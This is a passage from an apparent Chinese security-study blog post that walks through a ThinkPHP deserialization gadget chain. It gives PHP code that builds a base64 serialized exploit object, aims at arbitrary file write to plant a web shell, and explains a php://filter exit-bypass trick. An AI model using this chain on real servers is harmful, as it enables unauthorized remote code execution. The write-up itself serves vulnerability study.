punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span> <span class="token operator">?</span> <span class="token variable">$value</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getAttr</span><span class="token punctuation">(</span><span class="token variable">$attr</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 进行判断</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可知想得到可控的$value，必须使$modelRelation可控</p><p><strong>而modelRelation调用了relation，并最终调用数组append</strong></p><p><strong>数组append可控</strong>*</p><p>还需要modelRelation可控，可以将$modelRelation设为getError</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// error可控</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="getRelationData-Relation-modelRelation"><a href="#getRelationData-Relation-modelRelation" class="headerlink" title="getRelationData(Relation $modelRelation)"></a>getRelationData(Relation $modelRelation)</h3><p>我的最终目的是可以通过$value去Output类的<code>__call</code>方法</p><p>所以返回的$value应是一个不存在的方法</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getRelationData</span><span class="token punctuation">(</span>Relation <span class="token variable">$modelRelation</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token variable">$modelRelation</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">isSelfRelation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">get_class</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getModel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">get_class</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 首先获取关联数据</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token punctuation">,</span> <span class="token string">'getRelation'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$modelRelation</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getRelation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BadMethodCallException</span><span class="token punctuation">(</span><span class="token string">'method not exists:'</span> <span class="token punctuation">.</span> <span class="token function">get_class</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'-> getRelation'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在跳转的这个方法中，第一条if语句是可控的，可以调用到Output类，条件</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span> <span class="token comment" spellcheck="true">// 存在parent</span>    <span class="token comment" spellcheck="true">/*写就有，目标也肯定是Output类*/</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token variable">$modelRelation</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">isSelfRelation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// $modelRelation 不为isSelfRelation方法</span>    <span class="token comment" spellcheck="true">/*无关紧要*/</span><span class="token operator">&amp;&amp;</span><span class="token function">get_class</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getModel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">get_class</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// parent的类名与$modelRelation指向结果类名一致</span>    <span class="token comment" spellcheck="true">/*    * get_class($this->parent) == think\console\Output    * get_class($modelRelation->getModel())    */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="getModel"><a href="#getModel" class="headerlink" title="getModel()"></a>getModel()</h4><p><img src="image-20211009215539409.png" alt="image-20211009215539409"></p><p>该方法完成了一次调用，跳至<code>thinkphp/library/think/db/Query.php</code>的getModel方法</p><h4 id="geModel-Query类"><a href="#geModel-Query类" class="headerlink" title="geModel() // Query类"></a>geModel() // Query类</h4><p><img src="image-20211009215724513.png" alt="image-20211009215724513"></p><p>返回一个model，其中model是可控的</p><p>按照上面的条件</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">get_class</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getModel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">get_class</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>只需要使Relation类中query指向Query类，Query中model指向Output类即可</p><p>此时需要用到之前提到的数组error，该类完整的调用关系应该是</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$modelRelation</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span><span class="token operator">-</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//注意$modelRelation条件</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token punctuation">,</span> <span class="token string">'getBindAttr'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>所以要将$modelRelation 赋值为一个可以调用query，或者说和Relation类有关系且存在getBindAttr的对象，并且Relation是抽象类，所以优先找子类</strong></p><p>搜索后发现：</p><p><img src="image-20211010095910991.png" alt="image-20211010095910991"></p><p>model下有个名为OneToOne的抽象类继承了Relation类</p><p>抽象类不能被实例化，所以找OneToOne的子类</p><p><img src="image-20211010100147506.png" alt="image-20211010100147506"></p><p>这里有两个子类，随便一个应该都可以，这里我想和wp区分开，所以我用BelongsTo类</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">BelongsTo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时应该可以进入Output类</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//调用至Model类</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>BelongsTo</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$parent</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 对parent的调用出了子类，所以需要改为public</span>    <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BelongsTo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"getError"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// Windows对此进行了继承，所以需要写一下</span><span class="token keyword">class</span> <span class="token class-name">Windows</span> <span class="token keyword">extends</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*Pivot类继承了Model类，所以files引用Pivot实例会跳转Model类的toString*/</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// Pivot类</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//调用Output类</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Output</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//调用Query类（Relation前置）</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Query</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span> <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 调用Relation类（Model的条件判断）</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Relation</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 调用向Query，完成函数</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">////调用继承了Relation的子类</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Relation</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">OneToOne</span> <span class="token keyword">extends</span> <span class="token class-name">Relation</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//调用继承了OneToOne的子类</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">BelongsTo</span> <span class="token keyword">extends</span> <span class="token class-name">OneToOne</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"no"</span><span class="token punctuation">,</span><span class="token string">"123"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 使bindAttr值存在</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//输出exp</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20211010114906516.png" alt="image-20211010114906516"></p><h3 id="class-Output-call"><a href="#class-Output-call" class="headerlink" title="class Output __call()"></a>class Output __call()</h3><p>在这里进了__call</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">styles</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">array_unshift</span><span class="token punctuation">(</span><span class="token variable">$args</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token string">'block'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//调用回调函数，并把一个数组参数作为回调函数的参数</span>        <span class="token comment" spellcheck="true">/*把第一个参数作为回调函数调用，把参数数组(第二个参数)作为回调函数的的参数传入。*/</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span> <span class="token operator">&amp;&amp;</span> <span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">'method not exists:'</span> <span class="token punctuation">.</span> <span class="token constant">__CLASS__</span> <span class="token punctuation">.</span> <span class="token string">'->'</span> <span class="token punctuation">.</span> <span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以这里调用了block方法，继续跟上去</p><h3 id="block"><a href="#block" class="headerlink" title="block()"></a>block()</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//block</span><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">block</span><span class="token punctuation">(</span><span class="token variable">$style</span><span class="token punctuation">,</span> <span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeln</span><span class="token punctuation">(</span><span class="token string">"&lt;{$style}>{$message}&lt;/$style>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//跟进writeln</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">writeln</span><span class="token punctuation">(</span><span class="token variable">$messages</span><span class="token punctuation">,</span> <span class="token variable">$type</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">OUTPUT_NORMAL</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$messages</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//跟进write</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$messages</span><span class="token punctuation">,</span> <span class="token variable">$newline</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$type</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">OUTPUT_NORMAL</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$messages</span><span class="token punctuation">,</span> <span class="token variable">$newline</span><span class="token punctuation">,</span> <span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/**private $handle = null; handle可控*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>到这里再跟下去没有意义，因为handle可控，所以直接全局搜write方法，寻找利用点</p><p>可以找到/thinkphp/library/think/session/driver/Memcached.php</p><p><img src="image-20211010151914110.png" alt="image-20211010151914110"></p><p>这里handle仍然可控，所以开始全局搜set()方法</p><h3 id="File-php"><a href="#File-php" class="headerlink" title="File.php"></a>File.php</h3><p>一个一个找下去，可以找到一个写入文件的类</p><p><img src="image-20211010153014237.png" alt="image-20211010153014237"></p><p>这里我认为可能存在文件写入来造成rce，不过截止目前我并没有想到绕过的方法</p><p>反而收获一个小技巧</p><h4 id="绕过“死亡”exit"><a href="#绕过“死亡”exit" class="headerlink" title="绕过“死亡”exit"></a>绕过“死亡”exit</h4><p>在$data可控的前提下，这里可以进行任意文件的写入，但程序运行到exit就会终止，所以程序本身的exit()过滤掉</p><p><strong>这个技巧可以看P牛的文章<code>https://www.leavesongs.com/PENETRATION/php-filter-magic.html</code></strong></p><p>简单来说只是用到了base64的一点小技巧</p><p>base64执行过分可以分为两步</p><blockquote><p>1、将不属于base64编码的字符“处理”掉</p><p>2、解码处理后的base64字符串</p></blockquote><p>若$data可控，那么就可以将要执行的代码进行base64编码后写入文件</p><p>然后用php特有的php://filter 协议以base64-decode的形式读取，这样程序自己写入的<code>&lt;?php exit();?&gt;</code>就会被解释为乱码，而我们自己写入的内容被正常解析，这样就达到了上传恶意文件的目的</p><p>不过显然这一步没法利用，但之后可以</p><h4 id="filename可控"><a href="#filename可控" class="headerlink" title="filename可控"></a>filename可控</h4><p>言归正传，想直接getshell的美妙想法大概是凉凉了，所以继续学习wp</p><p>除了$expire外，$filename同样可控</p><p><img src="image-20211010171340538.png" alt="image-20211010171340538"></p><p>跟进getCacheKey()</p><h3 id="CacheKey"><a href="#CacheKey" class="headerlink" title="CacheKey()"></a>CacheKey()</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getCacheKey</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$auto</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 先将传入的name值md5编码</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'cache_subdir'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 使用子目录</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token constant">DS</span> <span class="token punctuation">.</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token constant">DS</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$name</span> <span class="token punctuation">.</span> <span class="token string">'.php'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// options可控，文件路径可控</span>    <span class="token variable">$dir</span>      <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$auto</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//创建文件夹，权限755</span>        <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里可以创建一个具有读写权限的路径便于写入的shell执行一些操作</p><h3 id="setTagItem"><a href="#setTagItem" class="headerlink" title="setTagItem()"></a>setTagItem()</h3><p>回到File.php，在文件创建成功后会进行一次判断，</p><p><img src="image-20211010175515850.png" alt="image-20211010175515850"></p><p>跟进setTagItem()</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">setTagItem</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token variable">$key</span>       <span class="token operator">=</span> <span class="token string">'tag_'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 